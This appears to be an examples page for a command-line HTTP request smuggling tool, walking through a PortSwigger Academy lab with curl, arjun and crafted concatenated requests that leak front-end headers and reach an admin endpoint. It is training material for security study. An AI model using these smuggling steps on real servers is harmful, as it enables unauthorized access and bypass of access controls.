# Examples


The aim is to perform request smuggling from command line. The aim is not to totally replace Burp Suite but to propose another approach., with more CLi.

The following examples are an alternative to PortSwigger Burp solutions provided for the PortSwigger Burp academy

## [Exploiting HTTP request smuggling to reveal front-end request rewriting](https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting)


Browsing `/admin` endpoint we've got: `Admin interface only available if logged in as an administrator, or if requested from 127.0.0.1`

We also know that:
* The front-end server adds an HTTP header to incoming requests containing their IP address. We have to find its name
* The front-end does not support chunk encoding

Export an envvar for your lab endpoint:
```shell
export LAB_URL=[YOUR_LAB_URL]
```

### I - Find a POST parameter that is reflected in response
use [`arjun`](https://github.com/s0md3v/Arjun):
```shell
arjun -u $LAB_URL
[...]
[+] Heuristic scanner found 1 parameter: search
```

Confirm with it curl request:
```shell
curl -X POST [LAB_URL] --data "search=toto" | grep "toto" -C 10 --color
[...]                    <section class=blog-header>
                        <h1>0 search results for 'toto'</h1>
                        <hr>
                    </section>
[...]
```
Indeed, the `search` parameter is reflected in h1 tag

### II - Construct legitimate request that reflect parameters
```shell
# in one shell
httpecho -d search_legit
# in another shell
curl -X POST http://localhost:8888/ --data "search=toto" -H "Host: $LAB_URL" -H 'User-Agent:'  -H 'Accept:'
# empty headers to withdraw curl default ones
```

### III - Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal

To smuggle the request "embed" it in a normal request. The request will include a large Content-Length. As the back end use it, it will also include the first characters of the next request (which is provided by front end) **=> Added front-end headers can thus be accessible in the response 💥 **

To construct this request: construct a normal request: (always with `httpecho -d basic`)
```shell
curl -X POST http://localhost:8888/ --data "search=toto" -H "Host: [LAB_URL]" -H 'User-Agent:'  -H 'Accept:' -H 'Transfer-encoding: chunked'
# delete line to only have a 0\r\n\r\n in request, sed -i '4d' ./basic
# printf "\r\n\r\n"
```
And concatenate with the requets with a parameter but with a large `Content-Length` + w/o `Host` (~ `search_legit`):
```shell
cat basic search_legit_custom > smuggle
```